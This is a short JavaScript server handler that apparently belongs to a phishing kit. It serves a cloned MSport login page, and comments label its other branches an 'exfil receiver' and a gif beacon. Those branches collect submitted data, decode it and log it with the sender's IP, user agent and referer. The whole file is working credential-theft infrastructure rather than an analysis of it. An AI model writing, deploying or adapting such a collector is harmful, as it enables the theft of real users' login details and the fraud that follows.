const LOGIN_HTML = require('./login_html.js');

function clientIp(req) {
  const xff = req.headers['x-forwarded-for'];
  return xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress) || 'unknown';
}

module.exports = async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');
  if (req.method === 'OPTIONS') return res.status(204).end();

  // ---- POST: exfil receiver ----
  if (req.method === 'POST') {
    let body = '';
    await new Promise((resolve) => {
      req.on('data', (c) => { body += c; if (body.length > 2e6) req.destroy(); });
      req.on('end', resolve);
      req.on('error', resolve);
    });
    let payload = body;
    if (payload.startsWith('d=')) {
      try { payload = decodeURIComponent(payload.slice(2)); } catch (e) {}
    }
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    console.log('=== EXFIL HIT ===', JSON.stringify(hit));
    return res.status(200).json({ ok: true });
  }

  // ---- GET ?d=...: 1x1 gif beacon ----
  if (req.query && req.query.d) {
    let payload = String(req.query.d);
    try { payload = decodeURIComponent(payload); } catch (e) {}
    const hit = { t: new Date().toISOString(), ip: clientIp(req), ua: req.headers['user-agent'], referer: req.headers['referer'] || '', body: payload };
    console.log('=== EXFIL BEACON ===', JSON.stringify(hit));
    const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.setHeader('Cache-Control', 'no-store');
    return res.status(200).send(gif);
  }

  // ---- GET /api: serve the cloned MSport login page ----
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).send(LOGIN_HTML);
};
